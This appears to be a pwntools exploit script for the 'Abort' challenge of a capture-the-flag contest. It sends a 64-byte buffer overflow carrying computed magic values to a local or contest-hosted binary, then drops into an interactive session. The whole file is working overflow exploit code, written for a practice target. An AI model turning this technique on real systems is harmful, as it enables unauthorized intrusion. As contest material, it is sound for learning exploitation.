#!/usr/bin/env python3

from pwn import *

exe = ELF('Abort', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe
rop = ROP(exe)

context.terminal = ['/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', "--size", "0.6", '-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c' ]

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        set context-sections args regs disasm stack code expressions heap_tracker threads last_signal
        set follow-fork-mode parent
        
        b*0x0000000000401406


        
        c
        ''')
        input()

if args.REMOTE:
    p = remote('abort.aws.jerseyctf.com', 1337)
elif args.DOCKER:
    p = remote('127.0.0.1')
else:
    p = process([exe.path])
GDB()

def sub_401216(a1):
    return (a1 ^ 0x4B1D3F29) - 0x6E58D392

def sub_401230(a2):
    return (a2 - 0x6BDAD9EF) ^ 0x6F6F6F6F


def solve_sub_401216(a1):
    return (a1 + 0x6E58D392) ^ 0x4B1D3F29

def solve_sub_401230(a2):
    return (a2 ^ 0x6F6F6F6F) + 0x6BDAD9EF 


payload = cyclic(64) + p32(solve_sub_401216(0x5A7EAB95)) + p32(solve_sub_401230(0x6FA08E7E)) + b'arcade\x00 '

s(payload)

p.interactive()
